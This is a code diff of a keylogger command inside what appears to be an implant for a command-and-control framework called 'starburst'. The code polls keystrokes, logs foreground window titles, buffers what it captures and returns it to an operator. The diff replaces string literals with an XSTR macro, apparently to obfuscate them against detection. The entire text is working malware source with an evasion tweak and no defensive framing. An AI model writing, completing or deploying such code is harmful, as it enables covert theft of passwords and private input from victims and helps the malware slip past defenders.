@@ -32,7 +32,7 @@ auto declfn starburst::cmd_keylog(
     auto h_user32 = inst.kernel32.LoadLibraryA( _n );
     if ( !h_user32 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to load user32.dll" ) ) );
+            XSTR( "failed to load user32.dll" ) );
         return;
     }
 
@@ -52,7 +52,7 @@ auto declfn starburst::cmd_keylog(
     if ( !pGetAsyncKeyState || !pMapVirtualKeyA ||
          !pGetForegroundWindow || !pGetWindowTextA ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "failed to resolve keylog APIs" ) ) );
+            XSTR( "failed to resolve keylog APIs" ) );
         return;
     }
 
@@ -60,7 +60,7 @@ auto declfn starburst::cmd_keylog(
     auto buffer = static_cast<char*>( inst.heap_alloc( buf_cap ) );
     if ( !buffer ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
+            XSTR( "alloc failed" ) );
         return;
     }
     uint32_t buf_off = 0;
@@ -81,13 +81,13 @@ auto declfn starburst::cmd_keylog(
             pGetWindowTextA( cur_window, win_title, 255 );
 
             if ( win_title[0] && buf_off + 512 < buf_cap ) {
-                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "\n[" ) ) );
+                str_copy( buffer + buf_off, XSTR( "\n[" ) );
                 buf_off += 2;
                 uint32_t tlen = str_len( win_title );
                 if ( tlen > 200 ) tlen = 200;
                 memory::copy( buffer + buf_off, win_title, tlen );
                 buf_off += tlen;
-                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "]\n" ) ) );
+                str_copy( buffer + buf_off, XSTR( "]\n" ) );
                 buf_off += 2;
             }
         }
@@ -102,16 +102,16 @@ auto declfn starburst::cmd_keylog(
 
             // handle special keys
             if ( vk == VK_RETURN ) {
-                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[ENTER]\n" ) ) );
+                str_copy( buffer + buf_off, XSTR( "[ENTER]\n" ) );
                 buf_off += 8;
             } else if ( vk == VK_TAB ) {
-                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[TAB]" ) ) );
+                str_copy( buffer + buf_off, XSTR( "[TAB]" ) );
                 buf_off += 5;
             } else if ( vk == VK_BACK ) {
-                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[BS]" ) ) );
+                str_copy( buffer + buf_off, XSTR( "[BS]" ) );
                 buf_off += 4;
             } else if ( vk == VK_ESCAPE ) {
-                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[ESC]" ) ) );
+                str_copy( buffer + buf_off, XSTR( "[ESC]" ) );
                 buf_off += 5;
             } else if ( vk == VK_SPACE ) {
                 buffer[buf_off++] = ' ';
@@ -122,7 +122,7 @@ auto declfn starburst::cmd_keylog(
             } else if ( vk == VK_MENU || vk == VK_LMENU || vk == VK_RMENU ) {
                 // skip alt keys themselves
             } else if ( vk == VK_CAPITAL ) {
-                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[CAPS]" ) ) );
+                str_copy( buffer + buf_off, XSTR( "[CAPS]" ) );
                 buf_off += 6;
             } else if ( vk >= 0x30 && vk <= 0x39 ) {
                 // digit keys: check shift for symbols
@@ -143,7 +143,7 @@ auto declfn starburst::cmd_keylog(
                     buffer[buf_off++] = (char)( vk + 0x20 );  // lowercase
                 }
             } else if ( vk >= VK_F1 && vk <= VK_F12 ) {
-                str_copy( buffer + buf_off, symbol<char*>( const_cast<char*>( "[F" ) ) );
+                str_copy( buffer + buf_off, XSTR( "[F" ) );
                 buf_off += 2;
                 char fnum[4];
                 int_to_str( fnum, vk - VK_F1 + 1, 10 );
@@ -174,7 +174,7 @@ auto declfn starburst::cmd_keylog(
     buffer[buf_off] = '\0';
 
     if ( buf_off == 0 ) {
-        str_copy( buffer, symbol<char*>( const_cast<char*>( "(no keystrokes captured)" ) ) );
+        str_copy( buffer, XSTR( "(no keystrokes captured)" ) );
     }
 
     queue_response( inst, task_uuid, RESPONSE_SUCCESS, buffer );
